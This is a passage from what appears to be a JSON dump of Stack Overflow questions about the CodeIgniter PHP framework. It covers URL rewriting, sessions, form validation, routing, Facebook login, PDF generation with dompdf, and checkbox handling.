[1] =&gt; /tmp/phpruuIs2\n                [2] =&gt; /tmp/phpIEbSuK\n                [3] =&gt; /tmp/phpHDhaxs\n                [4] =&gt; /tmp/phpigwAza\n                [5] =&gt; /tmp/phpnEY8BS\n                [6] =&gt; /tmp/phpEytPEA\n                [7] =&gt; /tmp/phpRCcEHi\n                [8] =&gt; /tmp/phpeyUAK0\n                [9] =&gt; /tmp/php5aQFNI\n                [10] =&gt; /tmp/php07zSQq\n                [11] =&gt; /tmp/phppQHdU8\n                [12] =&gt; /tmp/php8GFGXQ\n                [13] =&gt; /tmp/phpbaQh1y\n                [14] =&gt; /tmp/phpqN7Z4g\n                [15] =&gt; /tmp/phpjPlP8Y\n                [16] =&gt; /tmp/phpYL3KcH\n            )\n\n        [error] =&gt; Array\n            (\n                [0] =&gt; 0\n                [1] =&gt; 0\n                [2] =&gt; 0\n                [3] =&gt; 0\n                [4] =&gt; 0\n                [5] =&gt; 0\n                [6] =&gt; 0\n                [7] =&gt; 0\n                [8] =&gt; 0\n                [9] =&gt; 0\n                [10] =&gt; 0\n                [11] =&gt; 0\n                [12] =&gt; 0\n                [13] =&gt; 0\n                [14] =&gt; 0\n                [15] =&gt; 0\n                [16] =&gt; 0\n            )\n\n        [size] =&gt; Array\n            (\n                [0] =&gt; 172159\n                [1] =&gt; 172159\n                [2] =&gt; 172159\n                [3] =&gt; 172159\n                [4] =&gt; 172159\n                [5] =&gt; 172159\n                [6] =&gt; 172159\n                [7] =&gt; 172159\n                [8] =&gt; 172159\n                [9] =&gt; 172159\n                [10] =&gt; 172159\n                [11] =&gt; 172159\n                [12] =&gt; 172159\n                [13] =&gt; 172159\n                [14] =&gt; 172159\n                [15] =&gt; 172159\n                [16] =&gt; 172159\n            )\n\n    )\n</code></pre>\n\n<p>)</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12349704,"title":"Codeigniter remove index.php","body":"<p>I am using CodeIgniter 2.1.1 my site structure is like</p>\n\n<pre><code>mysite/\n    application/\n        controllers/\n            backend/\n                welcome.php\n\n            welcome.php\n\n        views/\n            backend/\n            frontend/\n\n        .htaccess\n</code></pre>\n\n<p>and I can access backend with </p>\n\n<pre><code>http://localhost/mysite/index.php/backend\n</code></pre>\n\n<p>but I want </p>\n\n<pre><code>http://localhost/mysite/backend\n</code></pre>\n\n<p>Similarly for frontend I want</p>\n\n<pre><code>http://localhost/mysite/\n</code></pre>\n\n<p>In config/config.php I set </p>\n\n<pre><code>$config['base_url'] = '';\n$config['index_page'] = '';\n</code></pre>\n\n<p>and experiment many code in .htaccess the latest one is</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f \n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12347926,"title":"How can I use GET in codeignier contoller method?","body":"<p>I have a URL like this \n<a href=\"http://example.com/cronetab/realTimeDeliveryReport?externalId=14133337681891060&amp;deliveredTS=2012-09-10%2013:27:32&amp;status=Deliverd&amp;cause=Successfully%20Deliverd&amp;phoneNo=919995171152\" rel=\"nofollow\">http://example.com/cronetab/realTimeDeliveryReport?externalId=14133337681891060&amp;deliveredTS=2012-09-10%2013:27:32&amp;status=Deliverd&amp;cause=Successfully%20Deliverd&amp;phoneNo=919995171152</a></p>\n\n<p>cronetab is the controller name and realTimeDeliveryReport is the method that we invoke.\nSo we pass parameters in the above format.</p>\n\n<p>How can we take this parameters value in this function?\nor \nHow can I pass parameter like url?externalId=14133337681891060 this?</p>\n\n<p>Here, The URL is act like a callback URL. So the other server is attaching parameter like this.. So I need solution for this..</p>\n"},{"tags":["php","html","html5","codeigniter","iframe"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":49,"score":-1,"question_id":12349020,"title":"Is it possible to show some php content inside an html image?","body":"<p>Is it possible to display some php content within an HTML image (say display on the screen of an iPhone where iPhone being an image) </p>\n"},{"tags":["css","codeigniter","stylesheet","baseurl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":129,"score":0,"question_id":12349191,"title":"Codeigniter Base url not working in header","body":"<p>I am using the codeigniter Framework and unable to link the stylesheet to the pages! I have created a header and fotter file so the stylesheet is loaded in every page. The content is passing through however no style is being passed. My file layout follows:</p>\n\n<p>app\nassets\nindex.php\nsystem\nect..</p>\n\n<p>within my assets folder i have:</p>\n\n<p>assets/\ncss\nimages\njs\nincludes</p>\n\n<p>And in my header i have:</p>\n\n<pre><code>    &lt;!DOCTYPE html&gt;\n    &lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"\"&gt;\n&lt;title&gt;Site Name&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"&lt;?php echo base_url();?&gt; assets/css/style.css\"  type=\"text/css\" media=\"screen\" /&gt;\n\n    &lt;/head&gt;\n    &lt;body&gt;\n</code></pre>\n\n<p>In my homepage i load the header and footer using: $this->load->view('header');, $this->load->view('footer');</p>\n\n<p>I have checked my base url and set up a htaccess file and autoload the url helper. I have tried accessing my css file without base url (standard procedure) and still no luck. Any guidance will be appreciated. </p>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":12317276,"title":"Image resize with codeigniter","body":"<p>I've been searching for some tutorial or something that helps me solve this issue, I'm developing a website where users place ads offering rooms and when they place an ad they have the possibility to add some photos. I want to resize and decrease some quality of the photos  so they won't become to big. The problem is sometimes users insert weird resolutions, so I want to do something like the css background-size: cover property does. Resize photo so the smaller side fit and crop the rest.</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12345862,"title":"codeigniter upload image with other data","body":"<p>I have a form am submitting and user has the ability to upload a picture in that form then submit the form as whole. I found a tutorial on codeigniter site showing upload form (dedicated only to upload, not other data along). link is: <a href=\"http://codeigniter.com/user_guide/libraries/file_uploading.html\" rel=\"nofollow\">Codeigniter Upload Tutorial</a>. How can I submit the form and then upload the files while also uploading other details to other table in database?</p>\n"},{"tags":["php","mysql","codeigniter","mysql-error-1064"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":9740074,"title":"MySQL parse error (1064)","body":"<p>The problem is that when parsing this query:</p>\n\n<pre><code>SELECT * \n    FROM students student \n        INNER JOIN students_assessments assessments \n            ON student.student_id = assessments.sa_student_id \n        INNER JOIN courses course \n            ON student.student_course_id = course_id \n        INNER JOIN specialities spec \n            ON student.student_speciality_id = spec.speciality_id \n        INNER JOIN subjects subject \n            ON assessments.sa_subject_id = subject_id \n    WHERE student_fname LIKE '%John%' \n        AND student_lname LIKE '%' \n        AND student_course_id \n        AND speciality_id \n        AND sa_subject_id \n    ORDER BY student_id ASC LIMIT 0,20 \n</code></pre>\n\n<p>MySQL returns following error:</p>\n\n<pre><code>Error Number: 1064\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '498' at line 1\n\n498\n</code></pre>\n\n<p>The Query is escaped using CI_DB_driver escape before executed.</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12345124,"title":"Login Facebook App can't any infomation of user","body":"<p>I have a problem with my app login with facebook SDK (web using codeigniter)</p>\n\n<p>First, login ok with query data of user logged, but only email of user that I can't get it,</p>\n\n<p>So, I added scope to <code>$this-&gt;facebook-&gt;getLoginUrl('scope'=&gt;'email')</code> to get email, and then, I got email, But the problem is, I got nothing when I added code below:</p>\n\n<pre><code>$this-&gt;facebook-&gt;getLoginUrl(array('scope'=&gt;'email','redirect_uri' =&gt; $mycurrent_url))\n</code></pre>\n\n<p>redirect_uri to my current_url is corrected, but failed to get data.\n<strong>what I want is, get all data with redirect_uri!</strong></p>\n\n<p>Please, see the code:</p>\n\n<pre><code>$user = $this-&gt;facebook-&gt;getUser();\n\n    if($user) {\n\n        try {\n\n            $user_info = $this-&gt;facebook-&gt;api('/me');\n\n            $args = $logout_url;\n\n    $data['getLogoutUrl'] = $this-&gt;facebook-&gt;getLogoutUrl($args);\n\n    } catch(FacebookApiException $e) {\n            echo '&lt;pre&gt;'.htmlspecialchars(print_r($e, true)).'&lt;/pre&gt;';\n            $user = null;\n        }\n    } else {\n\n   $param = array('scope' =&gt; 'email','redirect_uri' =&gt; $mycurrent_url);\n\n       $data['getURLLogin'] = \"&lt;a href=\\\"\".$this-&gt;facebook-&gt;getLoginUrl($param).\"\\\"&gt;Login with facebook&lt;/a&gt;\";\n\n    }\n</code></pre>\n\n<p>what's wrong with this code?</p>\n\n<p>thank for help in advance.</p>\n"},{"tags":["php","codeigniter","controller"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":12344653,"title":"How can I use session in a library in CodeIgniter? ","body":"<p>I want to check if user is logged in CodeIgniter by using my library in the controller's constructor.</p>\n\n<p>This is my library:</p>\n\n<pre><code>class Administrator_libs {\n\n    public function validate_authen(){\n        if( $this-&gt;session-&gt;userdata('user_authen') ){\n            redirect(base_url().'admin/login/');\n        }   \n    }\n}\n</code></pre>\n\n<p>And this is my controller:</p>\n\n<pre><code>class Administrator extends CI_Controller {\n\n    public function __construct(){\n        parent::__construct();\n        $this-&gt;load-&gt;library('administrator_libs');\n        $this-&gt;administrator_libs-&gt;validate_authen();\n        $this-&gt;load-&gt;model('mod_menu');\n    }\n}\n</code></pre>\n\n<p>But I get this error message:</p>\n\n<pre><code>Undefined property: Administrator_libs::$session\n</code></pre>\n\n<p>How can I use session in a library in CodeIgniter?    </p>\n"},{"tags":["javascript","html","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12344384,"title":"passing items from list to controller","body":"<p>I have a drop-down list of items like below, and I would like to on-click send just the name such as \"classes\" or \"inheritance\" , to my controller.</p>\n\n<p></p>\n\n<pre><code>&lt;li&gt;&lt;a href=\"#\"&gt;Pointers&lt;/a&gt;&lt;/li&gt;   \n&lt;li&gt;&lt;a href=\"#\" class=\"parent\"&gt;Classes&lt;/a&gt;\n &lt;ul&gt;\n  &lt;li&gt;&lt;a href=\"#\"&gt;Shapes&lt;/a&gt;&lt;/li&gt;\n  &lt;li&gt;&lt;a href=\"#\"&gt;Submenu&lt;/a&gt;&lt;/li&gt;\n &lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"#\"&gt;Inheritance&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"#\"&gt;Polymorphism&lt;/a&gt;&lt;/li&gt;\n&lt;ul&gt;\n</code></pre>\n\n<p>My question is should if I should use  Javascript, such as:</p>\n\n<pre><code>   &lt;li&gt;&lt;a href=\"#\" id=\"someId\" onclick=\"SomeMethod(this);\" &gt; Pointers&lt;/a&gt;\n</code></pre>\n\n<p>Then How do i retrieve the element in my function and send to controller?</p>\n\n<p>or can I use use form action ? </p>\n"},{"tags":["php","mysql","codeigniter","database-design"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":76,"score":1,"question_id":12344478,"title":"What Is The Most Efficient and Easiest Way To Store a Users Country & State/Province/Suburb/Area In My PHP MySQL Web Application?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/24481/what-is-the-best-way-to-store-international-addresses-in-a-database\">What is the “best” way to store international addresses in a database?</a>  </p>\n</blockquote>\n\n\n\n<p>I would like the application to be global; meaning people from multiple countries (namely Australia, New Zealand, The United States and United Kingdom) can place listings. Because different countries have different formats of postcode, different classifications for areas (Australia and America have states, but places like Canada or the UK are different), how do I effectively store of all of this information?</p>\n\n<p>I just can't envision in my head what the MySQL database schema for something like this would look like. I don't need to store any coordinates, just the users country, suburb/city/area and state/province so I can properly classify all of the information and display it on a classified listing.</p>\n"},{"tags":["codeigniter","upload","pyrocms"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12336570,"title":"PyroCMS will upload only on local XAMPP server not on hosting platform","body":"<p>On my XAMPP server I have PyroCMS installed. Version 2.1.4 to be exact. When I go to upload files via the file browser in the admin page it will work. I installed the same version on my hosting platform and whenever I go to upload a PNG file it won't work. This is the error I get:</p>\n\n<pre><code>The filetype you are attempting to upload is not allowed.\n</code></pre>\n\n<p>I checked the file size limits and changed them to no avail. I was then told I should check the mime type of the image and see if that type is in the CodeIgniter mime type declarations. I did that and it came back as: <code>image/png</code>. Which was in fact in the declaration in and array with <code>image/x-png</code>. Does anyone have an idea of what's going on here? PNG is in the allowed file types and I am well out of ideas...</p>\n"},{"tags":["php","codeigniter","foreach"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12343719,"title":"how to add another attribute using foreach loop to an array of rows","body":"<p>I am using a <code>foreach</code> loop on an array of rows in a model file in <code>CodeIgniter</code>.\nWhat i want to do is reflect the changes i make in every row ,in the <code>foreach</code> loop ,to the original array.</p>\n\n<pre><code>        $unique = $this-&gt;db-&gt;get_where('list', array('item_index' =&gt; $item));\n        foreach ($unique-&gt;result_array() as $row)\n\n            {\n                $row[\"status\"]= \"Not Unique\";\n            if($row[\"bid_amount\"]==$amount)\n                {\n                    if($count==0){ $row[\"status\"]=\"Unique and Final\"; }\n                    else {$row[\"status\"]=\"Unique but Not Final\"; }\n\n                }\n\n                $count++;\n\n            }   \n        return $unique;\n</code></pre>\n\n<p>I am adding another attribute to each row here and i want to echo this attribute corresponding to each row in a view file.\nBut i am getting error  <code>Undefined index: status</code>.\nHow can i possibly reflect the changes in the array to be returned.</p>\n"},{"tags":["json","parsing","codeigniter","decode","encode"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12343374,"title":"CodeIginiter, not being able to do a JSON Encode output","body":"<p>I'm pretty sure I'm missing something simple, anyway, I have tried for the past three hours to JSON encode some query results, something I do it quite often with code igniter, however, it just doesn't work, and I have no idea why.</p>\n\n<p>I'm using CodeIgniter (latest version), PHP5.</p>\n\n<p>My three files.</p>\n\n<p>material_model MODEL</p>\n\n<pre><code>public function get_types(){\n    return $this-&gt;db-&gt;query(\"SELECT * FROM material_types ORDER BY type_id\")-&gt;result_array();\n} // end function get_types\n\npublic function get_material($name){\n    return $this-&gt;db-&gt;query(\"SELECT T.name as 'type', M.* FROM material M, material_types T WHERE T.type_id = M.type_id and T.name = '\".$name.\"' ORDER BY M.type_id and M.order\")-&gt;result_array();\n} // end function get_material_all\n</code></pre>\n\n<p>material Controller</p>\n\n<pre><code>public function get_all(){\n    $json['response'] = array('types' =&gt; array());\n    $json['response']['types'] = $this-&gt;material_model-&gt;get_types();\n\n\n    foreach ($json['response']['types'] as $item){\n    $name = $item['name'];\n\n    $json['response'][$name] = $this-&gt;material_model-&gt;get_material($name);          \n    }\n\n    $this-&gt;load-&gt;view('response', $json);\n}\n</code></pre>\n\n<p>response VIEW</p>\n\n<pre><code>$this-&gt;output-&gt;set_status_header(200);\n$this-&gt;output-&gt;set_header('Content-type: application/json');\necho json_encode($response);\n</code></pre>\n\n<p>The results -> <a href=\"http://goethedev.com/iib_ci/index.php/material/get_all/\" rel=\"nofollow\">http://goethedev.com/iib_ci/index.php/material/get_all/</a></p>\n\n<p>What I use to validate the JSON pages -> <a href=\"http://jsonformatter.curiousconcept.com/\" rel=\"nofollow\">http://jsonformatter.curiousconcept.com/</a></p>\n\n<p>I'm displaying the whole results up there, I already tried to narrow it down for testing purposes to just row_array, only a couple of fields from table material_types, but no luck, this is also a new server I'm working on, that's unlikely the problem, but I thought it was worth mentioning.</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","codeigniter","session","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12342283,"title":"Are CodeIgniter database sessions more secure even if cookies are encrypted?","body":"<h2>Question 1</h2>\n\n<p>Basically, what I'm asking is: Is <code>$config['sess_use_database'] = TRUE;</code> more secure even if <code>$config['sess_encrypt_cookie'] = TRUE;</code>?</p>\n\n<p>I keep stumbling on blogs, Stackoverflow posts, and even CI Docs that claim <code>$config['sess_use_database'] = TRUE;</code> is more secure, but it seems that location that <code>user_data</code> is stored (in cookie or in database) shouldn't quite matter from a security standpoint if the cookie is encrypted anyway.</p>\n\n<h2>Question 2</h2>\n\n<p>If you set <code>$config['sess_encrypt_cookie'] = FALSE;</code> and inspect the cookies, regardless of the value of <code>$config['sess_use_database']</code>, there is a (what appears to be md5) hash stuck on the end of the cookie - here's an example:</p>\n\n<pre><code>a:4{\n  s:10:\"session_id\";\n  s:32:\"a2caac03fc72d709ac280540a09d8ed7\";\n  s:10:\"ip_address\";\n  s:9:\"127.0.0.1\";\n  s:10:\"user_agent\";\n  s:100:\"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.14 Safari/537.4\";\n  s:13:\"last_activity\";\n  i:1347228760;\n}7aa8ebe3fc462bd86c0c0544a969cbda\n</code></pre>\n\n<p>What is the significance of <code>7aa8ebe3fc462bd86c0c0544a969cbda</code>? Where did it come from?</p>\n"},{"tags":["php","codeigniter","twitter-bootstrap","modal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12341350,"title":"Using modals in Codeigniter","body":"<p>I am creating a web app using codeigniter and Twitters CSS framework Bootstrap. </p>\n\n<p>I am wondering how I go about implementing their modal system <a href=\"http://twitter.github.com/bootstrap/javascript.html#modals\" rel=\"nofollow\">here</a> with the 'views'. I want to be able to click a button in a view file and for it to link to a controller but the view to open in the modal. If that makes sense? Any ideas would be great.</p>\n\n<p>Thanks</p>\n"},{"tags":["mysql","codeigniter","date"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":806,"score":0,"question_id":8829477,"title":"Codeigniter database date-compare","body":"<p>Im having a problem comparing dates in a database to a week from now using activerecord. I'm trying to return a list of events with their start date less than a week from now.</p>\n\n<p>The event_start_date is in the format of 2011-06-30 09:00:00</p>\n\n<pre><code>$this-&gt;db-&gt;select('event_id,title,event_start_date,location');\n$this-&gt;db-&gt;where('event_start_date &lt;=',DATE_ADD(NOW(),INTERVAL 7 DAYS ));\n$query = $this-&gt;db-&gt;get('sd_events');\n</code></pre>\n\n<p>Having trouble working out the right syntax for this, any help would be appreciated :-)</p>\n"},{"tags":["php","oop",".htaccess","codeigniter","routes"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12340259,"title":"codeigniter routes issue for main url","body":"<p>I have defined a new route on routes.php but it have problem.</p>\n\n<pre><code>$route['default_controller'] = \"index\";\n$route['404_override'] = '';\n$route['(:any)'] = \"oyna/oyun/$1\";\n</code></pre>\n\n<p>I want to redirect /2012.htm to oyna/oyun/2012.htm and I can but it create a new problem. I can't reach my other controller if I don't define as below:</p>\n\n<pre><code>$route['default_controller'] = \"index\";\n$route['404_override'] = '';\n$route['admin/(:any)/(:any)'] = 'admin/$1/$2';\n$route['admin/(:any)'] = 'admin/$1';\n$route['kategori/(:any)'] = \"oyna/kategori/$1\";\n$route['(:any)'] = \"oyna/oyun/$1\";\n</code></pre>\n\n<p>If i don't define any controllers on routes.php like above I can't reach that.\nWhat i need to do for solve?</p>\n"},{"tags":["jquery","ajax","codeigniter","session","cookies"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":1611,"score":6,"question_id":7980193,"title":"Codeigniter session bugging out with ajax calls","body":"<p>My CodeIgniter app uses the session library and saves data to the DB.</p>\n\n<p>I've been having some problems where blank sessions are created after a certain ajax call.</p>\n\n<p>Upon investigating, it seems that there were 2 simultaneous functions calls that fired off that require a session validation. One would fail and the other would be fine.</p>\n\n<p>I was able to fix this by not having them fire off simultaneously. But I still don't understand the REASON why it fails. Does it have to do with one call updating the user cookie and the 2nd call invalidating? Or maybe when reading the DB it dies somehow?</p>\n\n<p>I looked over the Session core class a bit and have not found any clues to the cause.</p>\n\n<p>If any one had the same problem before I would appreciate any advice on how to debug or what the cause is.</p>\n\n<p>Thanks!</p>\n\n<p>EDIT: </p>\n\n<p>I originally said there was a 408 status return. That was an unrelated case.</p>\n\n<p>This is the function that fires off MyVar.refresh() in parallel:</p>\n\n<pre><code>function (event)\n{\n    var self$ = this.a$;\n    var uid  = this.b$.val();\n    var tid  = this.c$.val();\n    var jqxhr = $.post('/controller1/index',{'uid':uid,'tid':tid,'action':true},function(re)\n    {\n        if(re.message != 'success')\n        {\n            MyVar.alert('&lt;span class=\"msg_error sprite\"&gt;&lt;/span&gt;' + re.error);\n            MyVar.refresh();\n        } \n\n    },'json');\n    MyVar.refresh();\n    return stopDefault(event);\n};\n</code></pre>\n\n<p><strong>POSSIBLE SOLUTIONS:</strong></p>\n\n<p>Found this: <a href=\"http://codeigniter.com/forums/viewthread/102456/\">http://codeigniter.com/forums/viewthread/102456/</a></p>\n\n<p>Apparently it doesn't play well with ajax. One solution is to disallow session update if it is an ajax call; only problem is that our site is mostly built with ajax..</p>\n\n<p>Also, just lowered the sess_time_to_update to something very frequent and ajax was doing fine. Also did a browser refresh and it did not timeout. Not sure why if the session ID has already changed upon an ajax call and browser cookies were never updated.</p>\n"},{"tags":["php","forms","validation","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12339892,"title":"Form_validation->run() always returns false","body":"<p>I'm trying to run a form, but apparently it always returns false.</p>\n\n<p>This is the code:</p>\n\n<pre><code>public function __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;helper(array('form', 'url'));\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'required');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required');\n\n}\n\npublic function index()\n{\n    if($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        $this-&gt;load-&gt;view('login/index');   \n    }\n    else\n    {\n        $this-&gt;load-&gt;view('login/loginSuccess');\n        $this-&gt;username = $this-&gt;input-&gt;post('loginName', TRUE);\n        $this-&gt;password = md5($this-&gt;input-&gt;post('loginPassword', TRUE));\n    }\n}\n</code></pre>\n\n<p>And here is my views:</p>\n\n<pre><code>&lt;?php echo \"&lt;p style=\\\"color: #a1d5ef\\\"&gt;\" . validation_errors() . \"&lt;/p&gt;\"; ?&gt;\n        &lt;?php echo form_open('login'); ?&gt;\n            &lt;ul class=\"create-account-table\"&gt;\n\n                &lt;li class=\"create-account-input\"&gt;Account Name:&lt;/li&gt;\n                &lt;input type=\"text\" name=\"username\" value=\"\"&gt;\n\n                &lt;li class=\"create-account-input\"&gt;Account Password:&lt;/li&gt;\n                &lt;input type=\"password\" name=\"password\" value=\"\"&gt;\n\n            &lt;/ul&gt;\n\n            &lt;ul class=\"create-character-table\"&gt;\n\n                &lt;input class=\"create-account-submit\" type=\"submit\" name=\"login\" value=\"Login\"&gt;\n                Do you not have an account? Please registrer one &lt;a href=\"/createaccount\"&gt;HERE&lt;/a&gt;\n\n            &lt;/ul&gt;\n        &lt;/form&gt;\n</code></pre>\n\n<p>I'm really confused why this won't return true at any all.  Does anyone see what I am doing wrong?</p>\n"},{"tags":["php","codeigniter","codeigniter-2","dompdf"],"answer_count":1,"favorite_count":3,"up_vote_count":11,"down_vote_count":0,"view_count":411,"score":11,"question_id":12210144,"title":"Can I pass data to the Codeigniter output class without displaying it?","body":"<p>I'm working on a way for users to be able to generate PDF copies of invoices and other tabular data. To do this, I've wrapped <a href=\"http://code.google.com/p/dompdf/\" rel=\"nofollow\">dompdf</a> into a library that I can use with CI and created a method that will generate a PDF based on the return value of CI's <code>output-&gt;get_output()</code>. The wrapper is similar to <a href=\"https://github.com/hadiariawan/CodeIgniter-Dompdf-Library\" rel=\"nofollow\">this one on Github</a>.</p>\n\n<p>The problem is, I can't figure out a way to get the view (and HTML/CSS needed for the PDF) into CI's output class other than <code>load-&gt;view()</code>, which is going to write to the browser.</p>\n\n<p>My only other choice would be to use curl to request the page, but that seems so silly to do since I can get it right from the output buffer. I just don't want the HTML sent to the browser, since I set headers telling the browser to expect a PDF.</p>\n\n<p>To be clear, this is what I want to accomplish (in the order that I want to accomplish it):</p>\n\n<ol>\n<li>Do everything I'd normally do to prepare the view for display</li>\n<li>Load the view into the CI output class, but not display it</li>\n<li>Pass the return value of <code>output-&gt;get_output()</code> to my dompdf library</li>\n<li>Set the appropriate headers</li>\n<li>Execute my dompdf method that will send the PDF to the browser</li>\n</ol>\n\n<p>I don't see any way of doing step 2 based on the <a href=\"http://codeigniter.com/user_guide/libraries/output.html\" rel=\"nofollow\">output class documentation</a>.</p>\n\n<p>Is it possible to get a view into the output class without displaying it? If so, how? I'm using CI 2.0.3.</p>\n\n<p><strong>Edit</strong></p>\n\n<p>The very helpful <a href=\"http://stackoverflow.com/users/734499/anthony-sterling\">Anthony Sterling</a> pointed out that <a href=\"https://twitter.com/AnthonySterling/status/241426835634786304\" rel=\"nofollow\">I can just get what I want from the loader class</a> by setting the third argument telling it to return a string rather than render the view to TRUE. E.g.:</p>\n\n<pre><code>$lotsaHtml = $this-&gt;load-&gt;view('fooview', $somearray, TRUE);\n</code></pre>\n\n<p>And that would be better in my particular instance since I don't need to load partials. However, this is still a valid and (I think) interesting question, it would also be handy to know if I could get the same from the OB, perhaps if I <em>did</em> have a bunch of partials. Those could be concatenated, but yuck.</p>\n\n<p>It seems like I should be able to get the output class to not render anything (else, why does <code>get_output()</code> exist?) so I can do something else with everything it knows about. I just can't find a way to make that happen.</p>\n\n<p><strong>Edit 2</strong></p>\n\n<p>Some pseudo (but not far from reality) code illustrating what I hope to do, by showing what I did and then explaining what I actually <em>wanted</em> to do.</p>\n\n<p>Let's say I have a public method <code>genpdf($id)</code> in a controller named <code>invoice</code> using a model named <code>inv</code>:</p>\n\n<pre><code>public function genpdf($invoiceId) {\n    $this-&gt;load-&gt;library('dompdflib');\n    $this-&gt;pagedata['invoice_data'] = $this-&gt;inv-&gt;getInvoice($invoiceId);\n    $html = $this-&gt;load-&gt;view('pdfgen', $this-&gt;pagedata, TRUE);\n    $this-&gt;dompdflib-&gt;sendPdf($html);\n}\n</code></pre>\n\n<p>That is almost identical to code that I have that works right now. There, I ask the loader to parse and give me the results of the <code>pdfgen</code> view as a string, which I pass to the function in my dompdf wrapper that sets headers and sends the PDF to the browser.</p>\n\n<p>It just seemed like this would be easy to do by just getting the output buffer itself (after setting headers correctly / etc). </p>\n\n<p>Or do I just have to call the output class <code>append_output()</code> in succession with every partial I load?</p>\n\n<p>Multiple methods loading a plethora of models need to work together to generate these (they're going in as an afterthought), so I was hoping to just collect it all and retrieve it directly from the output class. It could be that I just have to talk gradually to <code>output-&gt;append_output()</code> to make that happen.</p>\n"},{"tags":["codeigniter","form-validation"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":281,"score":2,"question_id":8977147,"title":"codeigniter: change html class when there is a form validation error?","body":"<p>when using CodeIgniter's form validation, I see that there is a <code>form_error()</code> function for printing out an error if one exists, and an empty html tag if not. Is there an easy way to do a boolean test if there is an error for a particular field or not? I'd like to change the class of the input element itself instead of just printing out an error. What is the best way to accomplish this?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":109,"score":0,"question_id":12338701,"title":"isset checkbox return null code igniter","body":"<p>I tried to get the value to my checkbox(1 = checked or 0 = unchecked) in this code(this is my views in my Code Igniter):</p>\n\n<pre><code>&lt;input type=\"checkbox\" name=\"Visible\" class=\"text\" value=\"1\"\n                &lt;?php $visible = isset($_POST['Visible'])? '1' : '0';?&gt;/&gt;\n</code></pre>\n\n<p>My questions are :</p>\n\n<ol>\n<li>Can someone explain to me why the result of $visible is always NULL?</li>\n<li>What is the function of <code>value=\"1\"</code> in this case?i was searching this case but people just says that we always need to add the value.</li>\n<li>How to get the right value?(1 = checked or 0 = unchecked)</li>\n</ol>\n\n<p>Thank you, and i know this is a very simple question but it keep gives me some errors since yesterday @_@</p>\n\n<p><strong>This is the bigger part of the code :</strong>\nAdd function is for save(in controller) 